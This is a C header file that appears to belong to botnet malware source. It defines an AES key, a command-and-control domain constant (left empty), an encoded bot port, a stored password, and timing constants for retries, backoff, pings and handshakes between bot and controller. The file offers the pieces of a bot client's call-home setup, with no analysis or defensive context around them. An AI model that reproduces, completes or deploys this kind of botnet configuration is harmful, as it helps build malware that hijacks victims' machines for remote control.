#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define AES_KEY "fd00e82a0a3d86af73deacaa9df16432"
#define CNC_DOMAIN ""
#define BOT_PORT "42480e8feede0e323710211cf2ad792330fc5711be8867891886ec15be8ad601"
#define Password "b4c4d0f3fad5c8ec76046ea95517e1412266c4e21a801dbb7d792102afcff1d8fe35284185de0ff65279f7887a91585f"

#define INITIAL_RETRY_DELAY 2
#define MAX_RETRY_DELAY 300
#define BACKOFF_MULTIPLIER 2
#define RESOLVE_RETRY_INTERVAL 600
#define RECV_TIMEOUT_MS 12000
#define CONNECTION_TIMEOUT 3
#define PING_INTERVAL 4
#define HANDSHAKE_RETRIES 3
#define COMM_ERROR_THRESHOLD 3
